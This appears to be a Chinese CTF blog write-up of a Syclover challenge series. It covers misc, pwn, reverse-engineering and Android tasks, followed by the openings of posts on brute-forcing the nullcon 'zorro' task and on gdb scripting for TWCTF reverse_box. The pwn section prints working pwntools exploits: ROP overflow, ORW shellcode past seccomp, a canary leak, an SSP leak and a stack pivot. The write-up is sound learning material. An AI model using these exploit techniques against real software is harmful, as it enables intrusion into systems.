访问之后下载到第四部分，利用base64转图片发现转不出来了，观察下数据，发现是一段 base64很有规律的重复，将重复的base64提取出来然后解base64就得到了flag。0x09 RPG真是太好玩了吧我这边一直打不开,也就没法做了。官方WP说题目没啥难度,打通关就能拿到flag。而且为了防止CE修改破坏游戏体验,设置了当 任意人物到达30级时会出线变态怪物的设定.但是忘记加异常状态抗性了,很轻松就被打死了, 这算一个非预期吧.。0x10 I wanna be a geek每次修改save文件即可跳关。 flag在背景图上。0x11 游戏玩累了 不如来听听歌吧做的时候忽略了题目的含义吉良吉影发动了败者食尘！时间开始倒流了!。看了WP知道需要倒放(从后往前分析)。倒放后在开头有摩斯编码,解码得到flag。0x12 马里奥真是太有趣了参考官方WP:下载下来是个nes后缀的文件，下载nes模拟器打开发现是初代SMB游玩过了一世界库巴后会告诉你flag在8-4。直接金手指跳到8-4，从水关回来就是flag。0x13 The final师傅们tql! wp见师傅们给的wp:WP传送门PWN0x01 Find toolspwntools远程拿到key,base64解码,然后send, 注意要interactive,不然拿不到flag。0x02 BabyROP简单ROP,但官方WP说有小坑???12345from pwn import * p = remote('pwnto.fun',10000)payload = 'a'*0x88 + p64(0x400618) p.sendline(payload) p.interactive()0x03 Babyshellcode12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)开了seccomp，通过seccomp-tools查看可知允许Open read write，所以采用ORW123456789101112131415161718from pwn import *# context.log_level='debug'context.arch='amd64'sh = process(\"./RushB\")buf_addr=0x123000shellcode = \"\"shellcode += shellcraft.amd64.pushstr('./flag').rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_open',\"rsp\", 0).rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_read',\"rax\", 0x123500,40).rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_write',1, 0x123500,40).rstrip()sh.recvuntil(\"A simple shellcode for U, have fun!\")sh.sendline(asm(shellcode))sh.recvuntil(\"Why not play CSGO?\")sh.sendline('A'*0x38+p64(buf_addr))print(sh.recv())print(sh.recv())0x04 EasyCanary泄露Canary。1234567891011121314151617181920212223242526272829303132from pwn import *#c = remote('pwnto.fun',10001)c = process('./canary')#gdb.attach(c,'b fun')systemaddr = 0x08048647payload = 'a'*21print c.recvline()print c.recvline()c.send(payload)print c.recvline()s = c.recv()canary = u32('\\x00'+s[21:24])log.info('canary = ' + hex(canary))payload2 = 'a'* 20payload2 += p32(canary)payload2 += 'a'*12payload2 += p32(systemaddr)sleep(0.5)c.sendline(payload2)c.interactive()0x05 BabyCanarySSP Leak12345678910111213141516171819from pwn import *c = remote('pwnto.fun',10007)c.recvline()bufaddr = c.recvline()[18:]addr = int(bufaddr,16)payload = p64(addr)*250c.recvline()c.sendline(payload)print c.recvline()c.interactive()0x06 not bad相比babyshellcode，多了栈迁移，依旧是ORW123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments12345678910111213141516171819202122232425262728from pwn import *context.log_level='debug'context.arch='amd64'sh = process(\"./bad\")shellcode = \"\"shellcode += shellcraft.amd64.pushstr('./flag').rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_open',\"rsp\", 0).rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_read',\"rax\", 0x123500,40).rstrip()shellcode += shellcraft.amd64.linux.syscall('SYS_write',1, 0x123500,40).rstrip()shellcode = asm(shellcode)jmp_rsp = 0x0000000000400a01payload = \"\"payload += asm(\"mov rax,rsp;add rax,0x18\",arch=\"amd64\",os=\"linux\")payload += asm(shellcraft.amd64.linux.syscall('SYS_read',0,\"rax\",0x60).rstrip())payload = payload.ljust(0x20,'\\x90') # paddingpayload += p64(0xdeadbeef) # fake_ebppayload += p64(jmp_rsp)payload += asm(\"sub rsp,0x30;jmp rsp\",arch=\"amd64\",os=\"linux\").ljust(8,'\\x90')sh.recvuntil(\"Easy shellcode, have fun!\")sh.send(payload)sh.send(shellcode)print(sh.recv())print(sh.recv())print(sh.recv())RE0x01 Jiang’s fan签到题目,IDA打开就能看到flag0x02 secret拖入IDA找到关键字符串5379637B6E30775F794F755F6B6E6F775F6234736531367D,直接base16解码或者直接hex转ascii得到flag。0x03 Easy VB用OD动态调试, 不能用IDA。调试发现是将输入的flag与字符串12345a789012345678g012345a789012逐位异或,然后将结果与bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O比较,如果相等则输入flag正确。所以直接上脚本就行。1234567# -*- coding: UTF-8 -*-a = '12345a789012345678g012345a789012'b = 'bKPObQ@goYBGRXjtVKVSn^@kFQh[V_]O'flag = ''for i in range(len(a)): flag += chr(ord(a[i])^ord(b[i]))print flag0x04 冰菓C#逆向,用dnSpy打开以后就能找到关键算法,直接逆算法就行。脚本如下:123456789101112# -*- coding: UTF-8 -*-L1 = [119,77,103,79,21, 115,133,97,115,87, 22,115,103,89,88, 93,22,89,119,81]L2 = [57,13]flag = ''for i in range(20): flag += chr( (L1[i] - L2[1])^ L2[0] )print flag0x05 PYC是啥子嘛拿到PYC程序反编译以后, 可以看出来是个迷宫, 大小为10×10，稍微改改可以变成这种形式。要从S(Start) 走到 E(End)且路径长度最短, &amp;表示往上走, $表示往下走, 6表示往左走, 3表示往右走。flag为 Syc{Your Input}0x06 Dll Reverse题目加载_setup0.dll,调用里面的_TRocMxlr函数, 如果_TRocMxlr函数返回为true,则提示正确。 所以需要sub_10001028(Str) != 012345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879char __usercall sub_10001028@&lt;al&gt;(const char *a1@&lt;eax&gt;)&#123; const char *v1; // edi signed int v2; // kr00_4 int v3; // eax int v4; // esi _BYTE *v5; // eax int v6; // ecx char *v7; // edx char v8; // si int v9; // edi char v10; // bl int v11; // esi signed int v12; // ecx int v13; // esi char v14; // al char v15; // al int v16; // eax int v18; // [esp+8h] [ebp-8h] int v19; // [esp+Ch] [ebp-4h] v1 = a1; v2 = strlen(a1); v3 = v2 / 3; v18 = v2 % 3; if ( v2 % 3 ) v4 = 4 * v3 + 4; else v4 = 4 * v3; v5 = malloc(v4 + 1); v6 = 0; v5[v4] = 0; v19 = v4 - 2; if ( v4 - 2 &gt; 0 ) &#123; v7 = (char *)(v1 + 1); do &#123; v8 = *(v7 - 1); v9 = *v7; v5[v6] = base64Table[*(v7 - 1) &gt;&gt; 2]; v10 = base64Table[(v9 &gt;&gt; 4) | 16 * (v8 &amp; 3)]; v11 = v7[1]; v5[v6 + 1] = v10; v5[v6 + 2] = base64Table[(v11 &gt;&gt; 6) | 4 * (v9 &amp; 0xF)]; v5[v6 + 3] = base64Table[v11 &amp; 0x3F]; v6 += 4; v7 += 3; &#125; while ( v6 &lt; v19 ); &#125; if ( v18 == 1 ) &#123; *(_WORD *)&amp;v5[v6 - 2] = '=='; &#125; else if ( v18 == 2 ) &#123; v5[v6 - 1] = '='; &#125; v12 = 0; v13 = v5 - s1; do &#123; v14 = s1[v13 + v12]; if ( v12 % 2 ) v15 = s1[v12] ^ v14; else v15 = (s1[v12] ^ v14) + 3; byte_10003390[v12++] = v15; &#125; while ( v12 &lt; 32 ); v16 = 0; while ( byte_10003390[v16] == s2[v16] ) &#123; if ( ++v16 &gt;= 32 ) return 1; &#125; return 0;&#125;根据伪代码, 这个函数先把我们输入的flag进行base64加密,然后分情况进行异或运算,最后与s2进行比较,如果如果一致,则成功。注意这里的base64进行了换表!!!! 这里的base64Table为BCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/另外:12345v12 = 0;v13 = v5 - s1;do&#123; v14 = s1[v13 + v12];这一块不太容易搞清v14 = s1[v13+v12]到底是什么? 通过OD动态调试得知, v14每次都是依次取的flag经过base64加密以后的字符串的字符。所以解密脚本如下:1234567891011121314151617181920212223242526272829# -*- coding: UTF-8 -*-import base64import strings1 = '''45 6A 43 34 56 3B 4F 67 47 43 19 23 43 75 6C 673B 65 54 46 42 37 01 50 55 60 49 24 18 4A 27 1F09 1D 4A 00'''L1 = s1.split()s2 = '''22 59 32 5E 38 0B 42 56 26 70 4D 4513 22 2D 1D 5B 37 70 03 12 60 7C 36 07 53 03 534F 78 56 26 '''ss = ''L2 = s2.split()print L2for i in range(32): if i%2 == 1: ss += chr(int(L1[i],16) ^ int(L2[i],16)&amp;0xff) else: ss += chr(int(L1[i],16) ^ (int(L2[i],16) - 3)&amp;0xff)print ssstring1 = \"ABCDEFGHIJKLMNOPQSVXZRWYTUeadbcfghijklmnopqrstuvwxyz0123456789+/\"string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"print base64.b64decode(ss.translate(string.maketrans(string1,string2)))0x07 Win32 Program0x08 阅兵你认真看了么官方WP如下:可以直接爆破MD5,字典选用ABCD,就五位,直接正向爆破得到ACBAD 。也可以在线解密MD5。可以分析到unk_2020A0为数独第一行。unk_2020C4为数独的第二行到第九行。由此可以得到数独:1234567891 2 0 5 4 3 0 0 00 3 0 0 9 8 0 0 00 0 0 0 6 0 0 0 53 0 0 0 0 4 0 0 00 0 7 0 5 0 8 0 00 0 0 6 0 0 0 0 95 0 0 0 7 0 0 0 00 0 0 4 2 0 0 1 00 0 0 9 8 1 0 2 3在线数独求解可得从而得到我们应该输入679845716297812345981276642931281374512369848935677645运行程序并输入两组答案ACBAD和679845716297812345981276642931281374512369848935677645即可得到flag。0x09 Python1这道题挺顶的,反编译以后的代码如下:12345678910111213141516171819202122232425262728293031323334353637383940414243import struct, timedef b(a): return a &amp; 0xffffffffffffffffLdef c(str): return struct.unpack('&lt;Q', str)[0]def d(a): for i in range(64): a = a * 2 if a &gt; 0xffffffffffffffffL: a = b(a) a = b(a ^ 0xb0004b7679fa26b3L) return aif __name__ == '__main__': cmp_data = [ 7966260180038414229L, 16286944838295011030L, 8598951912044448753L, 7047634009948092561L, 7308282357635670895L] input = raw_input('plz input your flag:') if len(input) % 8 != 0: for i in range(8 - len(input) % 8): input += '\\x00' arr = [] for i in range(len(input) / 8): value = d(c(input[i * 8:i * 8 + 8])) arr.append(value) for i in range(5): if arr[i] != cmp_data[i]: print 'fail' time.sleep(5) exit() print 'success' time.sleep(5) exit()重点在于b函数和d函数。如果a经过×2运算以后大于0xffffffffffffffffL(即溢出了),则先按位与0xffffffffffffffffL,然后再与0xb0004b7679fa26b3L异或,则得到的结果一定为奇数。如果a经过×2运算以后小于等于0xffffffffffffffffL,则一定为偶数。另外一个关键点在于,如何还原溢出的数据?对于这个程序,如果a×2(相当于左移1位)以后溢出了,那么损失的是最高位(转换成二进制来看),最低位会自动补为0。那么我们只需要补回来最高位(加上2的最高位次方,比如这次是加上2的64次方)然后再除以2就能得到原来的a了。根据这些可以得出解密脚本。鉴于C语言unsigned long long 最大有64位, 而我们的溢出位就是第64位,所以我们可以先除以2,然后再加上原本要补的值的一半,就相当于先加上要补的值然后再除以2。12345678910111213141516171819202122232425// C语言版解密脚本#include &lt;stdio.h&gt;int main()&#123; unsigned long long answer[] = &#123; 0x6e8dd76d3b876f95L, 0xe206da09daf4bed6L,0x77559d346e134bf1L, 0x61ce39cac5eaf891L, 0x656c3c155520e36fL &#125;; for(int i = 0; i&lt;5; i++) &#123; unsigned long long tmp = answer[i]; for (int j = 0; j &lt; 64; j++) &#123; if (tmp &amp; 1)//结果为奇数 &#123; tmp ^= 0xb0004b7679fa26b3;//先异或回去。 tmp &gt;&gt;=1;//相当于除以2 tmp += 0x8000000000000000;//加上要补值(2的64次方)的一半 &#125; else//结果为偶数 &#123; tmp&gt;&gt;=1; &#125; &#125; answer[i] = tmp; &#125; puts((char*)answer);&#125;此刻python的优势显出来了。Python解密脚本如下:1234567891011121314151617# -*- coding:utf-8 -*import structdef decode(a): for i in range(64): if(a % 2 == 0): a /= 2 else: a ^= 0xB0004B7679FA26B3 a = a + 0xffffffffffffffff + 1 a /= 2 return aif __name__ == \"__main__\": cmp_data = [7966260180038414229L, 16286944838295011030L, 8598951912044448753L, 7047634009948092561L, 7308282357635670895L] flag = \"\" for i in range(5): flag += struct.pack(\"&gt;Q\",decode(cmp_data[i]))[::-1].strip()#需要注意这里的[::-1],用来逆序！ print flag0x10 Python2反编译以后得到如下代码:123456789101112131415161718192021222324252627282930313233343536373839404142import struct, timedef fun(start, end, s): a = 32310901 b = 1729 c = s m = end - start while True: d = int((a * c + b) % m) yield d c = dif __name__ == '__main__': arr = [ 77, 263, 394, 442, 463, 512, 667, 641, 804, 752, 885, 815, 1075, 1059, 1166, 1082, 1429, 1583, 1696, 1380, 1987, 2263, 2128, 2277, 2387, 2670, 2692, 3255, 3116, 3306, 3132, 3659, 3139, 3422, 3600, 3584, 3343, 3546, 3299, 3633, 3281, 3146, 2990, 2617, 2780, 2893, 2573, 2584, 2424, 2715, 2513, 2324, 2080, 2293, 2245, 2309, 2036, 1944, 1931, 1817, 1483, 1372, 1087, 1221, 893, 785, 697, 586, 547, 324, 177, 184] flag = raw_input('plz input your flag:') length = len(flag) a = struct.unpack('&lt;I', flag[length - 4:].encode())[0] &amp; 255 b = [] c = fun(1, 255, a) for i in range(32): b.append(next(c)) d = [ 0 for i in range(72) ] for i in range(length): for j in range(32): a = ord(flag[i]) ^ b[j] d[(i + j)] += a for i in range(len(d)): if d[i] != arr[i]: print 'fail' time.sleep(5) exit(0) print 'success' time.sleep(5) exit(0)关键点1: 这个fun函数就是rand函数, 其参数s即为随机数种子。关键点2: 如何确定这个随机数种子。关键点3: 如何确定flag的长度。首先: d的长度为72, b的长度为32 。通过这一部分能知道, 我们最大能够访问到d[71], 而j最大取到31,所以length(flag的长度)最大取到40,所以flag的长度为41。而且, d[0]只能由d[0+0]来访问，即i和j均为0。 d[71]只能由d[31+40]来访问到,所以需要d[0] = arr[0] = 77,d[71] = arr[71] = 184。又因为flag的开头为Syc{, 开头第一个为S,末尾为}。所以b[0] = ord(‘S’)^d[0] = 30, b[31] = ord(‘}’) ^ d[71] = 194又因为 a = struct.unpack(&#39;&lt;I&#39;, flag[length - 4:].encode())[0] &amp; 255,所以随机数种子的取值为 0~255 。然后就可以爆破这个随机数种子了。爆破脚本如下:123456789101112131415161718# -*- coding: UTF-8 -*-def fun(start, end, s): a = 32310901 b = 1729 c = s m = end - start while True: d = int((a * c + b) % m) yield d c = dfor seed in range(0,256): b = [] c = fun(1, 255, seed) for i in range(32): b.append(next(c)) if b[0] == 30 and b[31] == 197: print seed break得出来 seed 为 49 。b为b = [30, 243, 208, 79, 68, 71, 24, 83, 90, 65, 118,219, 76, 115, 12, 17, 108, 37, 218, 7, 180, 179, 110,175, 88, 181, 248, 45, 8, 249, 114, 197]然后利用z3约束求出flag。Z3脚本如下:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding: UTF-8 -*-from z3 import *arr = [ 77,263,394,442,463,512,667,641, 804,752,885,815,1075,1059,1166, 1082,1429,1583,1696,1380,1987, 2263,2128,2277,2387,2670,2692, 3255,3116,3306,3132,3659,3139, 3422,3600,3584,3343,3546,3299, 3633,3281,3146,2990,2617,2780, 2893,2573,2584,2424,2715,2513, 2324,2080,2293,2245,2309,2036, 1944,1931,1817,1483,1372,1087, 1221,893,785,697,586,547,324, 177,184]b = [30, 243, 208, 79, 68, 71, 24, 83, 90, 65, 118, 219, 76, 115, 12, 17, 108, 37, 218, 7, 180, 179, 110,175, 88, 181, 248, 45, 8, 249, 114, 197]flag = [BitVec('flag%d'%i,8) for i in range(41)]length = len(flag)solver = Solver()for i in range(41): solver.add(flag[i]&gt;=32) solver.add(flag[i]&lt;=127)for i in range(4): solver.add(flag[i] == ord('Syc&#123;'[i]))solver.add(flag[length-1] == ord('&#125;'))d = [0 for i in range(72)]for i in range(length): for j in range(32): a = flag[i] ^ b[j] d[i + j] += afor i in range(len(d)): solver.add(simplify(d[i] == arr[i]))if solver.check() == sat: m = solver.model() Flag = '' for i in range(41): Flag += chr(eval(str(solver.model().eval(flag[i])))) print Flag不一会就能得出flag,当然手动去逆也不是不可以。0x11 Python3Android0x01 Sign_in拖入JEB在主函数可以直接找到字符串U3lje1NpOW5fMW5fSTNfRTRzeSF9,base64解码即可得到flag。0x02 蒋学姐的秘密用户名可以在JEB里面找到,是Syclover, 密码是用户名的MD5, flag为Syc{密码}。0x03 正在尝试重新连接程序通过访问https://0xe4s0n.github.io/download/get_data.json获得一个字符串和一个data，我们访问这个链接可以知道字符串为Syclover,data是一个数组[&quot;33&quot;,&quot;28&quot;,&quot;21&quot;,&quot;20&quot;,&quot;93&quot;,&quot;13&quot;,&quot;13&quot;,&quot;96&quot;,&quot;0&quot;,&quot;11&quot;,&quot;66&quot;,&quot;27&quot;,&quot;51&quot;,&quot;42&quot;,&quot;10&quot;,&quot;12&quot;,&quot;1&quot;,&quot;85&quot;,&quot;41&quot;,&quot;38&quot;,&quot;34&quot;,&quot;23&quot;,&quot;60&quot;,&quot;33&quot;,&quot;23&quot;,&quot;86&quot;,&quot;2&quot;,&quot;94&quot;,&quot;2&quot;,&quot;90&quot;,&quot;4&quot;]程序有一个check方法,但是是在native层的, 所以我们分析native-lib.so。WP里面的F5解密是这样的…而我的F5界面是这样的…一些关键信息都没法正常显示。向出题人请教了一下以后得知,需要对a1进行类型转换。点一下a1 然后按Y,输出JNIEnv *,然后就very nice了。稍作修改以后逻辑挺简单, 将input与str[i%str__len]异或(其中str已经完成逆序,变成了revolcyS),如果结果与数组相同,则返回1,否则返回0。直接逆回去得到解密脚本:1234567# -*- coding: UTF-8 -*-s = 'Syclover'[::-1]data = [\"33\",\"28\",\"21\",\"20\",\"93\",\"13\",\"13\",\"96\",\"0\",\"11\",\"66\",\"27\",\"51\",\"42\",\"10\",\"12\",\"1\",\"85\",\"41\",\"38\",\"34\",\"23\",\"60\",\"33\",\"23\",\"86\",\"2\",\"94\",\"2\",\"90\",\"4\"]input = ''for i in range(len(data)): input+= chr(int(data[i]) ^ ord(s[i%len(s)]))print input运行即可得到flag。Coding","categories":[{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"}],"tags":[]},{"title":"一道逆向题引起的一系列爆破尝试","slug":"一道逆向题引起的一系列爆破尝试","date":"2019-09-28T08:15:49.000Z","updated":"2019-09-28T11:02:02.958Z","comments":true,"path":"2019/09/28/一道逆向题引起的一系列爆破尝试/","link":"","permalink":"http://liul14n.top/2019/09/28/一道逆向题引起的一系列爆破尝试/","excerpt":"","text":"[Adagio for Sunmmer Wind]()0x01 前言题目下载链接:下载链接0x02 主要函数部分1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071int __fastcall main(__int64 a1, char **a2, char **a3)&#123; size_t v3; // rax int v5; // [rsp+1Ch] [rbp-104h] int v6; // [rsp+20h] [rbp-100h] int i; // [rsp+24h] [rbp-FCh] unsigned int seed; // [rsp+28h] [rbp-F8h] unsigned int v9; // [rsp+2Ch] [rbp-F4h] char v10; // [rsp+30h] [rbp-F0h] char v11[16]; // [rsp+90h] [rbp-90h] char v12[32]; // [rsp+A0h] [rbp-80h] char s; // [rsp+C0h] [rbp-60h] char s1[40]; // [rsp+E0h] [rbp-40h] unsigned __int64 v15; // [rsp+108h] [rbp-18h] v15 = __readfsqword(0x28u); seed = 0; puts(\"Welcome to Pub Zorro!!\"); printf(\"Straight to the point. How many drinks you want?\", a2); __isoc99_scanf(\"%d\", &amp;v5); if ( v5 &lt;= 0 ) &#123; printf(\"You are too drunk!! Get Out!!\"); exit(-1); &#125; printf(\"OK. I need details of all the drinks. Give me %d drink ids:\", (unsigned int)v5); for ( i = 0; i &lt; v5; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v6); if ( v6 &lt;= 16 || v6 &gt; 0xFFFF ) &#123; puts(\"Invalid Drink Id.\"); printf(\"Get Out!!\"); exit(-1); &#125; seed ^= v6; &#125; i = seed; v9 = 0; while ( i ) &#123; ++v9; i &amp;= i - 1; &#125; if ( v9 != 10 ) &#123; puts(\"Looks like its a dangerous combination of drinks right there.\"); puts(\"Get Out, you will get yourself killed\"); exit(-1); &#125; srand(seed); MD5_Init(&amp;v10); for ( i = 0; i &lt;= 29; ++i ) &#123; v9 = rand() % 1000; sprintf(&amp;s, \"%d\", v9); v3 = strlen(&amp;s); MD5_Update(&amp;v10, &amp;s, v3); v12[i] = v9 ^ LOBYTE(dword_6020C0[i]); &#125; v12[i] = 0; MD5_Final(v11, &amp;v10); for ( i = 0; i &lt;= 15; ++i ) sprintf(&amp;s1[2 * i], \"%02x\", (unsigned __int8)v11[i]); if ( strcmp(s1, \"5eba99aff105c9ff6a1a913e343fec67\") ) &#123; puts(\"Try different mix, This mix is too sloppy\"); exit(-1); &#125; return printf(\"\\nYou choose right mix and here is your reward: The flag is nullcon&#123;%s&#125;\\n\", v12);&#125;0x03 分析通过输入饮料的瓶数 和 饮料的ID 来影响seed的值,从而影响MD5的值以及v12数组的值。当MD5值与题目所给的MD5相同时,则v12数组里面的值也就是正确的flag。0x04 第一次爆破尝试爆破思路, 爆破饮料的瓶数和饮料的ID。但是这样会比较麻烦, 当只要一瓶饮料的时候,爆破程序比较好写,当要两瓶及以上的饮料的时候,爆破程序写起来会复杂一些。比较幸运的是,这道题目正确的输入就是需要输入一瓶饮料。1234567891011121314151617181920212223# -*- coding: UTF-8 -*-from ctypes import *import hashliblibsystem = cdll.LoadLibrary('libc.so.6')for id in range(17, 0xffff + 1): seed = 0 seed ^= id v9 = 0 i = seed while i &gt; 0: v9 += 1 i &amp;= (i - 1) if v9 == 10: libsystem.srand(seed) h = hashlib.md5() for i in range(30): ran = libsystem.rand() ran = ran % 1000 h.update(\"%d\" % ran) if h.hexdigest() == '5eba99aff105c9ff6a1a913e343fec67': print 'num = 1 and id = %d' % (id) raw_input()需要注意的是 0 ^ x = x,所以 seed == id。这样跑出来(需要在Linux下跑)的结果是,饮料瓶数输入1,ID输入59306运行程序,这么输入进去就能得到flag0x05 第二次爆破尝试也可以直接爆破seed脚本如下:1234567891011121314151617181920212223242526272829303132# -*- coding: UTF-8 -*-from ctypes import *import hashliblibsystem = cdll.LoadLibrary('libc.so.6')# Extracted by handencryption_key = [ 0x03C8, 0x0032, 0x02CE, 0x0302, 0x007F, 0x01B8, 0x037E, 0x0188, 0x0349, 0x027F, 0x005E, 0x0234, 0x0354, 0x01A3, 0x0096, 0x0340, 0x0128, 0x02FC, 0x0300, 0x028E, 0x0126, 0x001B, 0x032A, 0x02F5, 0x015F, 0x0368, 0x01EB, 0x0079, 0x011D, 0x024E]need_md5 = '5eba99aff105c9ff6a1a913e343fec67'for seed in range(0xffff+1): i = seed v9 = 0 while(i): v9+=1 i &amp;= (i-1) if v9 == 10: libsystem.srand(seed) h = hashlib.md5() flag = '' for a in range(30): ran = libsystem.rand()%1000 h.update(\"%d\"%ran) flag += chr((ran^encryption_key[a])&amp;0xff) if h.hexdigest() == '5eba99aff105c9ff6a1a913e343fec67': print 'nullcon&#123;'+ flag+'&#125;'0x06 第三次爆破尝试这次的方法是借鉴的网上的WP, 这次利用的是python的subprocess模块。但是这个写这个脚本好像已经是确定了瓶数一定为1 ,这很玄学…脚本如下:12345678910111213141516171819# -*- coding: UTF-8 -*-import subprocessL = []for seed in range(0xffff+1): i = seed v9 = 0 while(i): v9+=1 i &amp;= (i-1) if v9 == 10: L.append(seed)for i in L: p = subprocess.Popen('./zorro_bin',stdin = subprocess.PIPE,stdout= subprocess.PIPE) out = p.communicate('1\\n%s\\n' % i)[0] if \"nullcon&#123;\" in out: print out break0x07 第四次爆破尝试这是第三种爆破方法的变形,利用的是pwntools,原理和三差不多,前提依然是要先知道饮料只要1瓶,脚本如下:1234567891011121314151617181920212223242526272829# -*- coding: UTF-8 -*-import subprocessL = []for seed in range(0xffff+1): i = seed v9 = 0 while(i): v9+=1 i &amp;= (i-1) if v9 == 10: L.append(seed)for i in L: p = subprocess.Popen('./zorro_bin',stdin = subprocess.PIPE,stdout= subprocess.PIPE) out = p.communicate('1\\n%s\\n' % i)[0] if \"nullcon&#123;\" in out: print outfor i in L: p = process('./zorro_bin') p.recvuntil('Straight to the point. How many drinks you want?') p.sendline(1) p.recvuntil('OK. I need details of all the drinks. Give me 1 drink ids:') p.sendline(i) str = p.recv() if 'nullcon&#123;' in str: print str break0x08 总结这道题解出来还是很玄学的,为什么瓶数一定是1,确实很令人费解。通过这道题目,也加强了自己写爆破脚本的能力。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"从一道题目学习gdb脚本","slug":"从一道题目学习gdb脚本","date":"2019-09-23T15:20:27.000Z","updated":"2019-09-28T09:54:03.599Z","comments":true,"path":"2019/09/23/从一道题目学习gdb脚本/","link":"","permalink":"http://liul14n.top/2019/09/23/从一道题目学习gdb脚本/","excerpt":"","text":"0x00 前言题目是TWCTF-reverse_box,题目下载链接如下:下载链接0x01 程序分析主要由两个函数来解题。123456789101112131415161718int __cdecl main(int a1, char **a2)&#123; size_t i; // [esp+18h] [ebp-10Ch] int v4; // [esp+1Ch] [ebp-108h] unsigned int v5; // [esp+11Ch] [ebp-8h] v5 = __readgsdword(0x14u); if ( a1 &lt;= 1 ) &#123; printf(\"usage: %s flag\\n\", *a2); exit(1); &#125; sub_804858D(&amp;v4); for ( i = 0; i &lt; strlen(a2[1]); ++i ) printf(\"%02x\", *((unsigned __int8 *)&amp;v4 + a2[1][i])); putchar(10); return 0;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl sub_804858D(_BYTE *a1)&#123; unsigned int v1; // eax int v2; // edx char v3; // al char v4; // ST1B_1 char v5; // al int result; // eax unsigned __int8 v7; // [esp+1Ah] [ebp-Eh] char v8; // [esp+1Bh] [ebp-Dh] char v9; // [esp+1Bh] [ebp-Dh] int v10; // [esp+1Ch] [ebp-Ch] v1 = time(0); srand(v1); do v10 = (unsigned __int8)rand(); while ( !v10 ); *a1 = v10; v7 = 1; v8 = 1; do &#123; v2 = v7 ^ 2 * v7; if ( (v7 &amp; 0x80u) == 0 ) v3 = 0; else v3 = 27; v7 = v2 ^ v3; v4 = 4 * (2 * v8 ^ v8) ^ 2 * v8 ^ v8; v9 = 16 * v4 ^ v4; if ( v9 &gt;= 0 ) v5 = 0; else v5 = 9; v8 = v9 ^ v5; result = (unsigned __int8)__ROR1__(v8, 4) ^ (unsigned __int8)__ROR1__(v8, 5) ^ (unsigned __int8)__ROR1__(v8, 6) ^ (unsigned __int8)__ROR1__(v8, 7) ^ (unsigned __int8)(v8 ^ *a1); a1[v7] = result; &#125; while ( v7 != 1 ); return result;&#125;题目提示如果传入正确的Flag则会输出95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4但是分析题目, 题目会取当前时间作为随机数种子,然后取一堆随机数执行一堆操作。由于当前时间在不断变化,所以这个随机数种子是不固定的,所取的随机数也不固定,这就对解题产生了很大的困难。但是查看这个算法函数sub_804858D的汇编代码,发现了惊喜!所取的随机数最后会跟0xFF进行按位与运算,这就会使此时eax的值只能取0-255其中一个,也就是说我们的v10只能取0-255中的一个,这就为我们执行爆破提供了可能。0x02 写脚本前的分析既然我们想进行爆破,但因为由于时间的变化随机数种子一直变会,v10也会一直变,所以我们直接控制v10。那么该如何控制v10呢？我们可以通过gdb脚本来在每次给v10赋值的时候进行暗箱操作。而这个赋值的时候通过IDA能够找到,就是图中0x080485B1的位置,因此我们需要在这个位置下个断点。该如何暗箱操作？ 既然赋值是通过eax寄存器来实现的,那么我们可以通过set $eax 计数器的形式来改变eax的值,计数器的范围就是0~255。而且根据要求,还需要满足首先输出0x95(因为题中用的printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v4 + a2[1][i]));,所以输出出来只有95)。我们来看printf这附近的汇编代码。依然是用eax寄存器来传值,又因为printf是在一个for循环里面,如果第一次输出的是95,则爆破成功,否则就让计数器+1 再来一遍~爆破成功以后我们就能得到这个a2[1][?]里面的内容了,从而就能逆出flag。0x03 脚本的实现123456789101112131415161718set $i=0set $total=256while($i&lt;$total)#循环条件 b *0x080485B1#下断点 b *0x08048704#下断点 run T #运行 set $eax=$i #给eax赋值 set $i=$i+1 #计数器自增 continue #因为下断点了, 所以需要有个continue if ($eax==0x95) print $i, $i #可有可无的一句 x/256xb $esp+0x1c #查看堆栈内容 set $i=256 #直接让计数器为256 从而退出while循环 end #结束if语句内容的写入 stop #暂停,因为如果爆破成功要查看堆栈内容 end #结束while语句内容的写入end #结束脚本通过define 脚本名称来新建一个脚本。通过脚本名称来调用一个脚本。运行脚本得到如下结果得出flag通过结果再结合题意逆出flag,脚本如下(Python)123456789101112131415161718192021222324252627282930313233343536373839404142434445# -*- coding: UTF-8 -*-s = '95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a'List = [ord(i) for i in s.decode('hex') ]str = '''0xd6 0xc9 0xc2 0xce 0x47 0xde 0xda 0x700x85 0xb4 0xd2 0x9e 0x4b 0x62 0x1e 0xc30x7f 0x37 0x7c 0xc8 0x4f 0xec 0xf2 0x450x18 0x61 0x17 0x1a 0x29 0x11 0xc7 0x750x02 0x48 0x26 0x93 0x83 0x8a 0x42 0x790x81 0x10 0x50 0x44 0xc4 0x6d 0x84 0xa00xb1 0x72 0x96 0x76 0xad 0x23 0xb0 0x2f0xb2 0xa7 0x35 0x57 0x5e 0x92 0x07 0xc00xbc 0x36 0x99 0xaf 0xae 0xdb 0xef 0x150xe7 0x8e 0x63 0x06 0x9c 0x56 0x9a 0x310xe6 0x64 0xb5 0x58 0x95 0x49 0x04 0xee0xdf 0x7e 0x0b 0x8c 0xff 0xf9 